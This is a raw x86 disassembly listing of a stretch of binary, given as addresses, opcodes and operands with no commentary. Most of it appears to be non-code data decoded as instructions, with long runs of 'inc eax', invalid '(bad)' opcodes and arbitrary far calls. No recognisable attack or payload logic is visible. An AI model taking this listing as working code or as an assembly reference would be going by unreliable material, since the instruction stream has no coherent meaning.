  418039:	cmp    bh,BYTE PTR [edi+0x1e72e44b]
  41803f:	leave  
  418040:	cmp    al,0x21
  418042:	leave  
  418043:	cmp    BYTE PTR [ecx+ebx*2],cl
  418046:	inc    ebp
  418047:	jl     0x418023
  418049:	inc    eax
  41804a:	inc    eax
  41804b:	inc    eax
  41804c:	inc    eax
  41804d:	inc    eax
  41804e:	inc    eax
  41804f:	inc    eax
  418050:	inc    eax
  418051:	inc    eax
  418052:	inc    eax
  418053:	test   al,0x62
  418055:	dec    ebp
  418056:	pop    edi
  418057:	clc    
  418058:	xchg   edx,eax
  418059:	bound  ebx,QWORD PTR [eax-0x5c34fa9a]
  41805f:	push   ecx
  418060:	fs inc ecx
  418062:	ss xchg DWORD PTR ds:[eax+0x75],ecx
  418067:	inc    edx
  418068:	neg    BYTE PTR [eax+0x648011e6]
  41806e:	je     0x418060
  418070:	inc    eax
  418071:	inc    eax
  418072:	inc    eax
  418073:	inc    eax
  418074:	inc    eax
  418075:	inc    eax
  418076:	inc    eax
  418077:	inc    eax
  418078:	add    BYTE PTR [edi-0x23],ah
  41807b:	inc    edx
  41807c:	push   eax
  41807d:	or     eax,0x8978e13f
  418082:	push   ebx
  418083:	push   edx
  418084:	or     eax,0xbf3ab5c9
  418089:	mov    ?,WORD PTR [ecx]
  41808b:	add    al,0xcb
  41808d:	cwde   
  41808e:	jge    0x418038
  418090:	dec    edi
  418091:	xchg   ebx,ecx
  418093:	int    0x41
  418095:	or     eax,0x404009a8
  41809a:	inc    eax
  41809b:	inc    eax
  41809c:	inc    eax
  41809d:	inc    eax
  41809e:	and    eax,0x36404040
  4180a3:	dec    esp
  4180a4:	dec    eax
  4180a5:	mov    BYTE PTR [ebp+0x604a12cd],dh
  4180ab:	ret    
  4180ac:	or     eax,0xbc452c42
  4180b1:	mov    eax,ds:0x7f41deb1
  4180b6:	(bad)  
  4180b7:	fs adc eax,0x9bb04153
  4180bd:	mov    al,ds:0x40404038
  4180c2:	inc    eax
  4180c3:	inc    eax
  4180c4:	inc    eax
  4180c5:	inc    eax
  4180c6:	inc    eax
  4180c7:	inc    eax
  4180c8:	inc    eax
  4180c9:	xor    al,0xcb
  4180cb:	mov    eax,ds:0x62ec38fd
  4180d0:	sub    al,BYTE PTR [eax+ebx*2-0x574e8685]
  4180d7:	sbb    al,0xf0
  4180d9:	add    eax,0xd73f614c
  4180de:	adc    BYTE PTR [eax],cl
  4180e0:	arpl   WORD PTR [edi+0x4040404d],ax
  4180e6:	inc    eax
  4180e7:	inc    eax
  4180e8:	inc    eax
  4180e9:	rol    DWORD PTR [eax+0x40],0x43
  4180ed:	jo     0x4180d7
  4180ef:	dec    esp
  4180f0:	arpl   WORD PTR [ebx],di
  4180f2:	inc    eax
  4180f3:	arpl   WORD PTR [ecx+0x1f],sp
  4180f6:	jmp    0x41ba453c
  4180fb:	sub    BYTE PTR [edx+0x79],dh
  4180fe:	jge    0x418157
  418100:	dec    edi
  418101:	bound  ecx,QWORD PTR [ebx]
  418103:	inc    eax
  418104:	arpl   WORD PTR [edi],di
  418106:	jle    0x418138
  418108:	inc    eax
  418109:	inc    eax
  41810a:	add    BYTE PTR [eax+0x40],al
  41810d:	inc    eax
  41810e:	inc    eax
  41810f:	inc    eax
  418110:	inc    eax
  418111:	mov    bh,ah
  418113:	xor    BYTE PTR [eax-0x61],al
  418116:	mov    DWORD PTR [ecx],esp
  418118:	dec    edi
  418119:	or     eax,0x595c213c
  41811e:	mov    bh,0x59
  418120:	clc    
  418121:	leave  
  418122:	(bad)  
  418123:	in     al,0x92
  418125:	loope  0x4180de
  418127:	inc    ebp
  418128:	sbb    BYTE PTR [eax+0xfc5f8b0],dh
  41812e:	inc    eax
  41812f:	inc    eax
  418130:	inc    eax
  418131:	inc    eax
  418132:	inc    eax
  418133:	inc    eax
  418134:	inc    eax
  418135:	inc    eax
  418136:	inc    eax
  418137:	inc    eax
  418138:	xor    edx,ecx
  41813a:	sti    
  41813b:	or     eax,0x614f6b05
  418140:	aas    
  418141:	push   edx
  418142:	test   al,0x43
  418144:	sub    ch,al
  418146:	adc    BYTE PTR [edi],0x49
  418149:	sub    BYTE PTR [ecx],dl
  41814b:	lods   al,BYTE PTR ds:[esi]
  41814c:	call   0x442e:0x7565c5a6
  418153:	inc    eax
  418154:	inc    eax
  418155:	inc    eax
  418156:	inc    eax
  418157:	inc    eax
  418158:	inc    eax
  418159:	int3   
  41815a:	jne    0x41819c
  41815c:	or     eax,0x55b84562
  418161:	retf   
  418162:	sbb    eax,DWORD PTR [edx+0x43]
  418165:	inc    eax
  418166:	and    eax,0xf23b6715
  41816b:	pop    ecx
  41816c:	test   al,0xc4
  41816e:	imul   eax,DWORD PTR [eax+0x0],0xffffffc1
  418172:	inc    eax
  418173:	inc    eax
  418174:	inc    eax
  418175:	inc    eax
  418176:	add    BYTE PTR [eax-0x41],al
  418179:	jno    0x4181c0
  41817b:	dec    eax
  41817c:	aam    0xd
  41817e:	cdq    
  41817f:	sar    BYTE PTR [edi+0x357cb1e5],1
  418185:	inc    eax
  418186:	inc    eax
  418187:	inc    eax
  418188:	inc    eax
  418189:	inc    eax
  41818a:	inc    eax
  41818b:	inc    eax
  41818c:	inc    eax
  41818d:	inc    DWORD PTR [eax-0x35]
  418190:	bound  eax,QWORD PTR [edi+0x2a]
  418193:	inc    ecx
  418194:	inc    ecx
  418195:	inc    ebx
  418196:	push   0xffffffb0
  418198:	cmp    DWORD PTR gs:[eax-0x5b],eax
  41819c:	xchg   ecx,eax
  41819d:	cs jge 0x4181ec
  4181a0:	clc    
  4181a1:	xor    al,0x2
  4181a3:	pusha  
  4181a4:	aam    0x2d
  4181a6:	bound  eax,QWORD PTR [esi+0x6c]
  4181a9:	and    DWORD PTR [ecx-0x5f],eax
  4181ac:	sbb    cl,dl
  4181ae:	mov    esi,0x14e565ac
  4181b3:	jle    0x4181ee
  4181b5:	sbb    eax,0x40404040
  4181ba:	inc    eax
  4181bb:	inc    eax
  4181bc:	inc    eax
  4181bd:	inc    eax
  4181be:	inc    eax
  4181bf:	inc    eax
  4181c0:	cld    
  4181c1:	in     al,0x24
  4181c3:	cwde   
  4181c4:	sub    BYTE PTR [ecx-0x578a1cb8],ah
  4181ca:	push   0x91bf4005
  4181cf:	pop    ds
  4181d0:	add    dl,BYTE PTR [eax]
  4181d2:	fmul   st(5),st
  4181d4:	sub    ah,BYTE PTR [edi+0x57]
  4181d7:	push   0xffffff88
  4181d9:	xchg   esp,eax
  4181da:	sub    BYTE PTR [eax+0x11],al
  4181dd:	ins    DWORD PTR es:[edi],dx
  4181de:	cmc    
  4181df:	jecxz  0x418237
  4181e1:	inc    ecx
  4181e2:	bound  eax,QWORD PTR [eax+0x40]
  4181e5:	inc    eax
  4181e6:	inc    eax
  4181e7:	inc    eax
  4181e8:	inc    eax
  4181e9:	inc    eax
  4181ea:	inc    eax
  4181eb:	add    BYTE PTR [ecx-0x50],al
  4181ee:	ss mov ebx,0xb840f29b
  4181f4:	adc    al,0xd
  4181f6:	sub    DWORD PTR [ecx-0x6a],esp
  4181f9:	nop
  4181fa:	mov    eax,?
  4181fc:	and    al,0xcd
  4181fe:	push   esp
  4181ff:	adc    DWORD PTR [eax+0x40],eax
  418202:	inc    eax
  418203:	inc    eax
  418204:	inc    eax
  418205:	inc    eax
  418206:	and    eax,0x2a404040
  41820b:	inc    edi
  41820c:	push   0xffffff98
  41820e:	inc    eax
  41820f:	inc    eax
  418210:	stos   DWORD PTR es:[edi],eax
  418211:	dec    ecx
  418212:	lahf   
  418213:	xchg   edx,eax
  418214:	add    al,0x5
  418216:	inc    edx
  418217:	inc    eax
  418218:	ins    BYTE PTR es:[edi],dx
  418219:	xor    DWORD PTR [ecx-0x3f],ecx
  41821c:	test   al,0x87
  41821e:	dec    ebp
  41821f:	jo     0x418244
  418221:	push   esi
  418222:	fst    st(0)
  418224:	adc    bh,BYTE PTR [edx-0x57]
  418227:	inc    eax
  418228:	pop    edx
  418229:	adc    eax,0x40401c5f
  41822e:	inc    eax
  41822f:	inc    eax
  418230:	inc    eax
  418231:	inc    eax
  418232:	inc    eax
  418233:	inc    eax
  418234:	inc    eax
  418235:	inc    eax
  418236:	push   0xffffff8f
  418238:	test   al,0x28
  41823a:	gs push eax
  41823c:	aad    0x62
  41823e:	xor    ebp,DWORD PTR [eax+0x42]
  418241:	inc    esp
  418242:	pop    esp
  418243:	xor    DWORD PTR [edx+0x40],ebx
  418246:	aad    0x13
  418248:	shr    BYTE PTR [edx],0xe3
  41824b:	mov    BYTE PTR [esi+0x4],cl
  41824e:	int    0x3d
  418250:	sub    al,0x40
  418252:	in     al,0x91
  418254:	stos   DWORD PTR es:[edi],eax
  418255:	adc    DWORD PTR [bx+si+0x40],eax
  418259:	inc    eax
  41825a:	inc    eax
  41825b:	inc    eax
  41825c:	inc    eax
  41825d:	rol    DWORD PTR [eax+0x40],0x75
  418261:	imul   eax,DWORD PTR [eax+0x5],0x41
  418265:	out    dx,eax
  418266:	ret    0x6194
  418269:	cmp    al,0x44
  41826b:	inc    esi
  41826c:	push   ecx
  41826d:	pop    ebp
  41826e:	inc    eax
  41826f:	inc    eax
  418270:	add    BYTE PTR [eax+0x40],al
  418273:	inc    eax
  418274:	inc    eax
  418275:	inc    eax
  418276:	inc    eax
  418277:	test   al,0xd
  418279:	add    al,0x2
  41827b:	dec    eax
  41827c:	xchg   DWORD PTR [ebx+eiz*1+0x43],eax
  418280:	int    0x63
  418282:	xor    al,0xb0
  418284:	mov    edi,0x432a6fb1
  418289:	inc    esp
  41828a:	gs add eax,0x41f64c4c
  418290:	aaa    
  418291:	xor    al,0x20
  418293:	xchg   DWORD PTR [eax],eax
  418295:	mov    cl,0x3
  418297:	or     al,bh
  418299:	cwde   
  41829a:	jne    0x4182dc
  41829c:	and    DWORD PTR [eax+0x40],eax
  41829f:	inc    eax
  4182a0:	inc    eax
  4182a1:	inc    eax
  4182a2:	inc    eax
  4182a3:	inc    eax
  4182a4:	inc    eax
  4182a5:	inc    eax
  4182a6:	inc    eax
  4182a7:	mov    edi,0xa86360c5
  4182ac:	fld    QWORD PTR [eax+0x7f]
  4182af:	inc    esi
  4182b0:	aaa    
  4182b1:	bound  ecx,QWORD PTR [ebx+esi*2+0x6b]
  4182b5:	pop    esp
  4182b6:	add    dl,BYTE PTR [edx-0x3103a41a]
  4182bc:	test   BYTE PTR [eax+0x40a3222f],bh
  4182c2:	xchg   esp,eax
  4182c3:	bound  esp,QWORD PTR [edi-0x3c]
  4182c6:	dec    edi
  4182c7:	int3   
  4182c8:	int3   
  4182c9:	int3   
  4182ca:	int3   
  4182cb:	int3   
  4182cc:	int3   
  4182cd:	int3   
  4182ce:	int3   
  4182cf:	int3   
  4182d0:	inc    eax
  4182d1:	mov    ah,0x40
  4182d3:	inc    eax
  4182d4:	inc    eax
  4182d5:	inc    eax
  4182d6:	inc    eax
  4182d7:	inc    eax
  4182d8:	int3   
  4182d9:	jne    0x41831b
  4182db:	add    eax,0x4fa54d05
  4182e0:	xor    DWORD PTR [ecx+0x7c8767fc],0x43494008
  4182ea:	push   0xb92dacd4
  4182ef:	mov    eax,0xa84e1182
  4182f4:	inc    ecx
  4182f5:	arpl   WORD PTR [edx+0x3d],sp
  4182f8:	and    ecx,DWORD PTR [eax+eax*2]
  4182fb:	add    cl,al
  4182fd:	inc    eax
  4182fe:	inc    eax
  4182ff:	inc    eax
  418300:	inc    eax
  418301:	add    BYTE PTR [eax-0x50],al
  418304:	inc    edx
  418305:	inc    esi
  418306:	rcl    DWORD PTR [ecx-0x64ce063d],0x2a
  41830d:	mov    esp,es
  41830f:	mov    edi,0x405d2db8
  418314:	inc    eax
  418315:	inc    eax
  418316:	inc    eax
  418317:	inc    eax
  418318:	inc    eax
  418319:	inc    eax
  41831a:	inc    eax
  41831b:	inc    DWORD PTR [eax-0x34]
  41831e:	inc    ecx
  41831f:	mov    eax,ds:0xed0568a3
  418324:	jne    0x4182b1
  418326:	addr16 cwde 
  418328:	mov    cl,BYTE PTR [eax]
  41832a:	leave  
  41832b:	in     al,dx
  41832c:	push   esi
  41832d:	pop    edi
  41832e:	cmp    al,0xa8
  418330:	sahf   
  418331:	inc    ecx
  418332:	dec    eax
  418333:	cmp    edi,0x3b
  418336:	bound  edx,QWORD PTR [eax]
  418338:	cs inc edx
  41833a:	outs   dx,BYTE PTR ds:[esi]
  41833b:	test   DWORD PTR [edx],edi
  41833d:	xor    BYTE PTR [ebp-0x64],ch
  418340:	inc    eax
  418341:	inc    eax
  418342:	inc    eax
  418343:	inc    eax
  418344:	inc    eax
  418345:	inc    eax
  418346:	inc    eax
  418347:	inc    eax
  418348:	inc    eax
  418349:	inc    eax
  41834a:	bound  edi,QWORD PTR [eax+eax*2]
  41834d:	test   BYTE PTR [edi],dl
  41834f:	pop    esp
  418350:	retf   0xcb42
  418353:	repz inc esp
  418355:	adc    al,0xff
  418357:	ja     0x418326
  418359:	inc    eax
  41835a:	inc    esp
  41835b:	test   al,0xdc
  41835d:	adc    BYTE PTR [edx],ch
  41835f:	pop    ds
  418360:	bound  ecx,QWORD PTR [esi+esi*1+0x40404040]
  418367:	inc    eax
  418368:	inc    eax
  418369:	inc    eax
  41836a:	inc    eax
  41836b:	add    BYTE PTR [eax],dl
  41836d:	rol    DWORD PTR [ebx+0x6a3e05d3],0xf2
  418374:	pop    eax
  418375:	dec    ebx
  418376:	pusha  
  418377:	push   edi
  418378:	stos   BYTE PTR es:[edi],al
  418379:	mov    ah,0x38
  41837b:	push   edx
  41837c:	inc    eax
  41837d:	inc    eax
  41837e:	inc    eax
  41837f:	inc    eax
  418380:	inc    eax
  418381:	inc    eax
  418382:	and    eax,0x41404040
  418387:	rol    DWORD PTR [ebx+edx*4],0xad
  41838b:	arpl   WORD PTR [eax+0x3698161c],bp
  418391:	sub    bh,BYTE PTR [edi]
  418393:	out    0x12,al
  418395:	nop
  418396:	lock inc eax
  418398:	inc    eax
  418399:	inc    eax
  41839a:	inc    eax
  41839b:	inc    eax
  41839c:	inc    eax
  41839d:	inc    eax
  41839e:	inc    eax
  41839f:	inc    eax
  4183a0:	inc    eax
  4183a1:	pusha  
  4183a2:	adc    dl,BYTE PTR [ecx+0x32]
  4183a5:	test   al,0x78
  4183a7:	push   edx
  4183a8:	(bad)  
  4183a9:	in     eax,0x81
  4183ab:	inc    edx
  4183ac:	pusha  
  4183ad:	inc    ecx
  4183ae:	aaa    
  4183af:	pop    ss
  4183b0:	les    esi,FWORD PTR [eax+eax*2]
  4183b3:	inc    eax
  4183b4:	inc    eax
  4183b5:	inc    eax
  4183b6:	inc    eax
  4183b7:	inc    eax
  4183b8:	rol    DWORD PTR [eax+0x40],0x47
  4183bc:	push   ecx
  4183bd:	xor    al,0x2a
  4183bf:	aad    0xc8
  4183c1:	lods   al,BYTE PTR ds:[esi]
  4183c2:	inc    ecx
  4183c3:	pop    es
  4183c4:	js     0x41836b
  4183c6:	adc    cl,ch
  4183c8:	bound  ebp,QWORD PTR [eax+0x35f39b44]
  4183ce:	dec    eax
  4183cf:	adc    DWORD PTR [esi],esi
  4183d1:	inc    eax
  4183d2:	int3   
  4183d3:	je     0x418426
  4183d5:	sub    BYTE PTR ds:0x462abe9c,dl
  4183db:	add    DWORD PTR [ecx-0x36],edx
  4183de:	inc    esp
  4183df:	or     eax,0x4040124c
  4183e4:	add    BYTE PTR [eax+0x40],al
  4183e7:	inc    eax
  4183e8:	inc    eax
  4183e9:	inc    eax
  4183ea:	inc    eax
  4183eb:	xor    BYTE PTR [esi-0x3280e0ff],cl
  4183f1:	(bad)  
  4183f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183f3:	inc    ebp
  4183f4:	add    edx,DWORD PTR [ebx-0x11]
  4183f7:	int3   
  4183f8:	inc    ebx
  4183f9:	add    eax,0x3c088715
  4183fe:	pop    es
  4183ff:	bound  ebp,QWORD PTR [ecx-0x34]
  418402:	retf   
  418403:	inc    eax
  418404:	xor    DWORD PTR ds:0x6f2848f6,0x40404091
  41840e:	inc    eax
  41840f:	inc    eax
  418410:	inc    eax
  418411:	inc    eax
  418412:	inc    eax
  418413:	inc    eax
  418414:	inc    eax
  418415:	inc    eax
  418416:	inc    eax
  418417:	mov    edi,0x40650d5d
  41841c:	mov    edi,0xf3c7005d
  418421:	retf   
  418422:	add    BYTE PTR [edx+0x48],ah
  418425:	pusha  
  418426:	and    dh,BYTE PTR [edi+0x26]
  418429:	dec    esi
  41842a:	add    al,0xc0
  41842c:	dec    ecx
  41842d:	les    eax,FWORD PTR [edx+0x78]
  418430:	call   0x4040:0x404065cf
  418437:	inc    eax
  418438:	inc    eax
  418439:	int3   
  41843a:	jne    0x41847c
  41843c:	and    BYTE PTR [edi+ecx*2+0x0],al
  418440:	xlat   BYTE PTR ds:[ebx]
  418441:	neg    bh
  418443:	test   al,0x52
  418445:	and    BYTE PTR [ebp+0x30],al
  418448:	inc    esi
  418449:	xchg   edx,ecx
  41844b:	sbb    al,0xc
  41844d:	mov    ebx,DWORD PTR [ecx]
  41844f:	push   edx
  418450:	ror    DWORD PTR [ebx-0x58],cl
  418453:	popf   
  418454:	clc    
  418455:	test   al,0xdc
  418457:	xchg   DWORD PTR [ebx],esi
  418459:	inc    edi
  41845a:	adc    ah,BYTE PTR [edx-0x4afa399e]
  418460:	adc    al,0x12
  418462:	push   esp
  418463:	inc    eax
  418464:	add    cl,al
  418466:	inc    eax
  418467:	inc    eax
  418468:	inc    eax
  418469:	inc    eax
  41846a:	add    BYTE PTR [eax+0x4c],al
  41846d:	leave  
  41846e:	cs leave 
  418470:	pusha  
  418471:	and    DWORD PTR [ecx+edx*1-0x58],ebp
  418475:	dec    esp
  418476:	fadd   QWORD PTR [ebx+edx*2+0x19]
  41847a:	xchg   ebx,eax
  41847b:	inc    ebx
  41847c:	adc    BYTE PTR [eax+0x40],al
  41847f:	inc    eax
  418480:	inc    eax
  418481:	inc    eax
  418482:	inc    eax
  418483:	inc    eax
  418484:	inc    eax
  418485:	inc    DWORD PTR [eax+0x53]
  418488:	inc    esp
  418489:	inc    esi
  41848a:	inc    ecx
  41848b:	sbb    esp,DWORD PTR [edi+0x6592a04e]
  418491:	ret    
  418492:	or     al,0x3d
  418495:	cmp    BYTE PTR ds:0x34694773,al
  41849b:	xchg   esi,eax
  41849c:	shl    DWORD PTR [edx+0x40],1
  41849f:	inc    eax
  4184a0:	inc    eax
  4184a1:	inc    eax
  4184a2:	inc    eax
  4184a3:	inc    eax
  4184a4:	inc    eax
  4184a5:	inc    eax
  4184a6:	inc    eax
  4184a7:	inc    eax
  4184a8:	retf   
  4184a9:	push   0x5cd41341
  4184ae:	or     eax,0x7dea4f98
  4184b3:	stc    
  4184b4:	add    DWORD PTR [edi],edi
  4184b6:	ret    
  4184b7:	inc    ebx
  4184b8:	xor    al,0x63
  4184ba:	inc    eax
  4184bb:	inc    eax
  4184bc:	inc    eax
  4184bd:	inc    eax
  4184be:	inc    eax
  4184bf:	inc    eax
  4184c0:	inc    eax
  4184c1:	inc    eax
  4184c2:	add    BYTE PTR [edi+0x40],ah
  4184c5:	inc    edx
  4184c6:	mov    bh,0xa8
  4184c8:	sub    BYTE PTR [esi+0x45],al
  4184cb:	mov    edi,0x72790040
  4184d0:	cs int3 
  4184d2:	cmp    al,0x28
  4184d4:	inc    eax
  4184d5:	js     0x418556
  4184d7:	imul   BYTE PTR [eax+0x40b92b9c]
  4184dd:	inc    eax
  4184de:	and    eax,0x404040cb
  4184e3:	inc    eax
  4184e4:	inc    eax
  4184e5:	inc    eax
  4184e6:	and    eax,0x12404040
  4184eb:	inc    edx
  4184ec:	mov    al,ds:0xf76cb462
  4184f1:	cmp    al,0x54
  4184f3:	in     al,dx
  4184f4:	bound  ebx,QWORD PTR [ebp+eax*1+0x40]
  4184f8:	inc    eax
  4184f9:	inc    eax
  4184fa:	inc    eax
  4184fb:	inc    eax
  4184fc:	inc    eax
  4184fd:	inc    eax
  4184fe:	inc    eax
  4184ff:	inc    eax
  418500:	inc    eax
  418501:	je     0x4184b4
  418503:	rol    DWORD PTR [ecx-0x58],0x46
  418507:	and    al,0x87
  418509:	inc    eax
  41850a:	cmp    al,0x29
  41850c:	add    dl,BYTE PTR [edx]
  41850e:	cmp    dl,bh
  418510:	push   eax
  418511:	jo     0x41854a
  418513:	in     al,dx
  418514:	clc    
  418515:	inc    ecx
  418516:	ins    DWORD PTR es:[edi],dx
  418517:	lods   al,BYTE PTR ds:[esi]
  418518:	inc    ebp
  418519:	inc    eax
  41851a:	inc    ebp
  41851b:	pcmpgtb mm0,QWORD PTR [eax+0x40]
  41851f:	inc    eax
  418520:	inc    eax
  418521:	inc    eax
  418522:	inc    eax
  418523:	rol    DWORD PTR [eax+0x40],0x11
  418527:	test   al,0xa8
  418529:	push   0x7e2a3372
  41852e:	enter  0x1110,0xbc
  418532:	inc    eax
  418533:	inc    ebp
  418534:	mov    ecx,0xb8b8cd80
  418539:	arpl   WORD PTR [eax-0x4f],sp
  41853c:	push   ebx
  41853d:	adc    DWORD PTR fs:[ecx+0x42],eax
  418541:	arpl   WORD PTR [edx],cx
  418543:	inc    ebx
  418544:	adc    dl,BYTE PTR [ecx+0x502608a0]
  41854a:	inc    eax
  41854b:	inc    eax
  41854c:	add    BYTE PTR [eax+0x40],al
  41854f:	inc    eax
  418550:	inc    eax
  418551:	inc    eax
  418552:	inc    eax
  418553:	adc    ecx,0xc80d62bb
  418559:	mov    ah,0x66
  41855b:	inc    ecx
  41855c:	imul   edx,esp,0x6462cdcd
  418562:	inc    eax
  418563:	ins    BYTE PTR es:[edi],dx
  418564:	cmc    
  418565:	mov    es,WORD PTR [ebx+0x42]
  418568:	or     dl,BYTE PTR [edx]
  41856a:	add    al,BYTE PTR [eax]
  41856c:	push   esi
  41856e:	shl    BYTE PTR [esp+eiz*2-0x20],0x41
  418573:	adc    ebp,DWORD PTR [ecx+0x50]
  418576:	leave  
  418577:	inc    eax
  418578:	inc    eax
  418579:	inc    eax
  41857a:	inc    eax
  41857b:	inc    eax
  41857c:	inc    eax
  41857d:	inc    eax
  41857e:	inc    eax
  41857f:	inc    eax
  418580:	inc    eax
  418581:	and    al,0x53
  418583:	adc    eax,0x92ff4014
  418588:	test   al,0x65
  41858a:	test   ebp,0xa0ef12e1
  418590:	adc    BYTE PTR ds:0x43ac684f,dh
  418596:	call   DWORD PTR [esp+edx*2-0x34d587d4]
  41859d:	add    ch,BYTE PTR [ecx+0x1]
  4185a0:	inc    ecx
  4185a1:	mov    al,ds:0x36154408
  4185a6:	frstpm(287 only) 
  4185a8:	inc    eax
  4185a9:	inc    eax
  4185aa:	inc    eax
  4185ab:	inc    eax
  4185ac:	inc    eax
  4185ad:	inc    eax
  4185ae:	int3   
  4185af:	jne    0x4185f1
  4185b1:	dec    ecx
  4185b2:	add    eax,0x43452ae3
  4185b7:	imul   esp,DWORD PTR [edi-0x7f9b78cc],0xa4df8162
  4185c1:	bound  edi,QWORD PTR [edi-0x1063f2b4]
  4185c7:	je     0x418560
  4185c9:	and    BYTE PTR [edi-0x7c9a3648],bh
  4185cf:	pop    ecx
  4185d0:	or     BYTE PTR [edi+edi*4],dh
  4185d3:	retf   
  4185d4:	inc    eax
  4185d5:	add    cl,al
  4185d7:	inc    eax
  4185d8:	inc    eax
  4185d9:	inc    eax
  4185da:	inc    eax
  4185db:	add    BYTE PTR [eax+0x4c],al
  4185de:	dec    eax
  4185df:	retf   
  4185e0:	loop   0x41856e
  4185e2:	sub    BYTE PTR [eax+ebp*4],ch
  4185e5:	or     eax,0xbeb7c445
  4185ea:	inc    eax
  4185eb:	inc    eax
  4185ec:	inc    eax
  4185ed:	inc    eax
  4185ee:	inc    eax
  4185ef:	inc    eax
  4185f0:	inc    eax
  4185f1:	inc    eax
  4185f2:	inc    DWORD PTR [eax+0x52]
  4185f5:	lds    edx,FWORD PTR [eax]
  4185f7:	retf   
  4185f8:	int    0x1
  4185fa:	push   edi
  4185fb:	imul   DWORD PTR [esi-0x37]
  4185fe:	inc    edx
  4185ff:	dec    ebx
  418600:	call   0x4126:0x68eb5443
  418607:	dec    edi
  418608:	test   al,0x2
  41860a:	inc    eax
  41860b:	inc    eax
  41860c:	inc    eax
  41860d:	inc    eax
  41860e:	inc    eax
  41860f:	inc    eax
  418610:	inc    eax
  418611:	inc    eax
  418612:	inc    eax
  418613:	inc    eax
  418614:	and    bl,BYTE PTR [eax]
  418616:	lods   al,BYTE PTR ds:[esi]
  418617:	sub    BYTE PTR [edx],0x20
  41861a:	adc    BYTE PTR [ecx],ch
  41861c:	mov    esi,0xbc48e256
  418621:	inc    edx
  418622:	mov    esp,0xa8947563
  418627:	inc    eax
  418628:	inc    eax
  418629:	inc    eax
  41862a:	inc    eax
  41862b:	inc    eax
  41862c:	inc    eax
  41862d:	inc    eax
  41862e:	inc    eax
  41862f:	add    BYTE PTR [eax+0x52],dh
  418632:	and    al,0x5
  418634:	add    DWORD PTR [ecx],edx
  418636:	xchg   BYTE PTR [eax],dl
  418638:	xor    al,0xf7
  41863a:	dec    esp
  41863b:	retf   
  41863c:	pop    es
  41863d:	cmp    ch,al
  41863f:	push   esp
  418640:	sub    cl,BYTE PTR [edi-0x58]
  418643:	adc    al,BYTE PTR [ebx]
  418645:	adc    eax,0x40d542b2
  41864a:	inc    eax
  41864b:	inc    eax
  41864c:	inc    eax
  41864d:	inc    eax
  41864e:	inc    eax
  41864f:	and    eax,0x25404040
  418654:	adc    dl,BYTE PTR [eax+0x73]
  418657:	inc    esi
  418658:	jg     0x4186d8
  41865a:	jns    0x418666
  41865c:	loopne 0x418673
  41865e:	adc    BYTE PTR [ecx],0xc6
  418661:	aam    0xf6
  418663:	retf   
  418664:	inc    eax
  418665:	inc    eax
  418666:	inc    eax
  418667:	inc    eax
  418668:	inc    eax
  418669:	inc    eax
  41866a:	inc    eax
  41866b:	inc    eax
  41866c:	inc    eax
  41866d:	inc    eax
  41866e:	inc    ecx
  41866f:	retf   
  418670:	xor    eax,0x44650172
  418675:	mov    ecx,0x5144472f
  41867a:	mov    ebp,0x80282c08
  41867f:	inc    esi
  418680:	add    eax,0x28032441
  418685:	push   edx
  418686:	(bad)  
  418687:	loopne 0x418626
  418689:	xchg   ebx,eax
  41868a:	pop    esi
  41868b:	jno    0x4186da
  41868d:	shr    BYTE PTR [eax+0x3a],1
  418690:	dec    edx
  418691:	dec    ebp
  418692:	inc    eax
  418693:	inc    eax
  418694:	inc    eax
  418695:	inc    eax
  418696:	inc    eax
  418697:	inc    eax
  418698:	rol    DWORD PTR [eax+0x40],0xa7
  41869c:	bound  ecx,QWORD PTR [ebp-0x7d57d5bc]
  4186a2:	mov    cl,0xbb
  4186a4:	ins    DWORD PTR es:[edi],dx
  4186a5:	inc    esp
  4186a6:	cmp    DWORD PTR [ecx+edx*1-0x3f6721d2],edi
  4186ad:	sub    al,0x24
  4186af:	ss and eax,0x62299521
  4186b5:	adc    eax,DWORD PTR es:[ebx+0x23]
  4186b9:	add    DWORD PTR [ebx],ebp
  4186bb:	mov    al,ds:0x40004040
  4186c0:	inc    eax
  4186c1:	inc    eax
  4186c2:	inc    eax
  4186c3:	inc    eax
  4186c4:	inc    eax
  4186c5:	(bad)  
  4186c6:	(bad)
  4186c9:	ja     0x4186cb
  4186cb:	xor    ecx,DWORD PTR [ebx+0x5e62424f]
  4186d1:	fadd   DWORD PTR [ecx+0x406f0ebf]
  4186d7:	inc    eax
  4186d8:	inc    eax
  4186d9:	inc    eax
  4186da:	inc    eax
  4186db:	inc    eax
  4186dc:	inc    eax
  4186dd:	inc    eax
  4186de:	inc    eax
  4186df:	inc    eax
  4186e0:	dec    ch
  4186e2:	push   ebp
  4186e3:	inc    eax
  4186e4:	ret    
  4186e5:	js     0x4186b5
  4186e7:	push   0x44
  4186e9:	adc    BYTE PTR [ecx],bh
  4186eb:	add    BYTE PTR [ebp+0x2c6218f5],0x42
  4186f2:	push   edx
  4186f3:	outs   dx,BYTE PTR ds:[esi]
  4186f4:	bound  eax,QWORD PTR [esi+eiz*4+0x54]
  4186f8:	inc    eax
  4186f9:	inc    eax
  4186fa:	inc    eax
  4186fb:	inc    eax
  4186fc:	inc    eax
  4186fd:	inc    eax
  4186fe:	int3   
  4186ff:	jne    0x418741
  418701:	and    al,0xcb
  418703:	js     0x4186cb
  418705:	adc    ecx,0xa8d51109
  41870b:	aam    0xa8
  41870d:	inc    edi
  41870e:	mov    ch,BYTE PTR [ebp+0x24424baa]
  418714:	and    eax,DWORD PTR [ecx]
  418716:	jno    0x418736
  418718:	inc    BYTE PTR ss:[ebp+esi*1+0x4a]
  41871d:	outs   dx,BYTE PTR ds:[esi]
  41871e:	inc    esi
  41871f:	retf   0x4464
  418722:	and    BYTE PTR ds:0x40318468,dl
  418728:	add    cl,al
  41872a:	inc    eax
  41872b:	inc    eax
  41872c:	inc    eax
  41872d:	inc    eax
  41872e:	add    BYTE PTR [eax-0x30],al
  418731:	jbe    0x41875f
  418733:	test   al,0x9a
  418735:	(bad)  
  418737:	and    dh,BYTE PTR [esp+ebp*1]
  41873a:	and    cl,BYTE PTR ds:0xb3272865
  418740:	pop    ss
  418741:	inc    esp
  418742:	ins    DWORD PTR es:[edi],dx
  418743:	leave  
  418744:	xchg   edx,eax
  418745:	imul   edi,DWORD PTR [esi+0x72],0x4040409b
  41874c:	inc    eax
  41874d:	inc    eax
  41874e:	inc    eax
  41874f:	inc    eax
  418750:	inc    eax
  418751:	inc    DWORD PTR [eax+0x67]
  418754:	xchg   ebp,eax
  418755:	mov    ah,0x78
  418757:	xor    eax,0x356a5105
  41875c:	inc    esp
  41875d:	inc    ecx
  41875e:	aad    0x4c
